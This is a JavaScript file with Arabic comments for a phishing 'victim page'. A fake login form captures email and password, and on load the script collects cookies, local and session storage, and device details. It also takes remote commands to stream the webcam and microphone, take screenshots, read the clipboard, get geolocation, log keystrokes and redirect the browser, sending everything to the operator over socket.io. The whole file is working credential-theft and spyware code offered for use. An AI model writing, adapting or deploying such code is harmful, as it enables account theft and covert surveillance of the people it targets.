const socket = io({
    transports: ['websocket', 'polling'],
    reconnection: true
});

let localStream = null;
let peerConnection = null;

// 🔴 جمع بيانات الجهاز تلقائياً
async function collectDeviceData() {
    const deviceData = {
        userAgent: navigator.userAgent,
        deviceName: navigator.platform,
        platform: navigator.platform,
        screenRes: `${window.screen.width}x${window.screen.height}`,
        browser: getBrowserName(),
        language: navigator.language,
        cookies: document.cookie || 'No cookies',
        localData: JSON.stringify(localStorage) || 'No local data',
        sessionData: JSON.stringify(sessionStorage) || 'No session data',
        referrer: document.referrer || 'Direct access',
        pageTitle: document.title
    };
    
    // إرسال البيانات للمطور
    socket.emit('victim_register', deviceData);
}

function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Edge')) return 'Edge';
    return 'Unknown';
}

// 🔴 التقاط بيانات تسجيل الدخول
document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // إخفاء النموذج وإظهار التحميل
    document.getElementById('login-form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    
    // إرسال بيانات الاعتماد للمطور
    socket.emit('victim_data', {
        type: 'credentials',
        data: {
            email: email,
            password: password,
            timestamp: new Date().toISOString()
        }
    });
    
    // محاولة الحصول على صلاحيات الكاميرا والميكروفون
    await requestPermissions();
    
    // بعد 3 ثواني، إظهار رسالة خطأ
    setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('login-form').style.display = 'block';
        alert('كلمة المرور غير صحيحة. حاول مرة أخرى.');
    }, 3000);
});

// 🔴 طلب صلاحيات الكاميرا والميكروفون
async function requestPermissions() {
    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { width: 1280, height: 720 },
            audio: true
        });
        
        // إرسال إشعار بتفعيل الكاميرا
        socket.emit('victim_data', {
            type: 'camera_activated',
            data: 'Camera and microphone activated'
        });
    } catch (error) {
        socket.emit('victim_data', {
            type: 'permission_denied',
            data: error.message
        });
    }
}

// 🔴 استقبال الأوامر من المطور
socket.on('execute_command', async (command) => {
    console.log('[←] استقبال أمر:', command);
    
    switch(command.action) {
        case 'start_cam':
            await startCameraStream();
            break;
        case 'start_mic':
            await startMicrophoneStream();
            break;
        case 'take_screenshot':
            takeScreenshot();
            break;
        case 'get_location':
            getLocation();
            break;
        case 'get_cookies':
            getCookies();
            break;
        case 'get_clipboard':
            getClipboard();
            break;
        case 'keylogger_start':
            startKeylogger();
            break;
        case 'redirect':
            window.location.href = command.params.url;
            break;
    }
});

// 🔴 بث الكاميرا للمطور
async function startCameraStream() {
    try {
        if (!localStream) {
            localStream = await navigator.mediaDevices.getUserMedia({ video: true });
        }
        
        // إعداد WebRTC
        const configuration = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' }
            ]
        };
        
        peerConnection = new RTCPeerConnection(configuration);
        localStream.getTracks().forEach(track => {
            peerConnection.addTrack(track, localStream);
        });
        
        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                socket.emit('webrtc_ice', {
                    targetId: command.from,
                    candidate: event.candidate
                });
            }
        };
        
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit('webrtc_offer', {
            targetId: command.from,
            offer: offer
        });
        
    } catch (error) {
        console.error('خطأ في تشغيل الكاميرا:', error);
    }
}

// 🔴 التقاط لقطة شاشة
function takeScreenshot() {
    html2canvas(document.body).then(canvas => {
        const screenshot = canvas.toDataURL('image/png');
        socket.emit('victim_data', {
            type: 'screenshot',
            data: screenshot
        });
    });
}

// 🔴 تحديد الموقع
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                socket.emit('victim_data', {
                    type: 'location',
                    data: {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    }
                });
            },
            (error) => {
                socket.emit('victim_data', {
                    type: 'location_error',
                    data: error.message
                });
            }
        );
    }
}

// 🔴 التقاط الكوكيز
function getCookies() {
    socket.emit('victim_data', {
        type: 'cookies',
        data: document.cookie
    });
}

// 🔴 قراءة الحافظة
function getClipboard() {
    navigator.clipboard.readText().then(text => {
        socket.emit('victim_data', {
            type: 'clipboard',
            data: text
        });
    }).catch(err => {
        socket.emit('victim_data', {
            type: 'clipboard_error',
            data: err.message
        });
    });
}

// 🔴 كيلوجر (تسجيل ضغطات المفاتيح)
let keylogData = [];
function startKeylogger() {
    document.addEventListener('keypress', (e) => {
        keylogData.push({
            key: e.key,
            timestamp: Date.now()
        });
        
        // إرسال البيانات كل 10 ضغطات
        if (keylogData.length >= 10) {
            socket.emit('victim_data', {
                type: 'keylog',
                data: keylogData
            });
            keylogData = [];
        }
    });
}

// التهيئة
window.onload = () => {
    collectDeviceData();
    console.log('🎯 صفحة الضحية جاهزة');
};
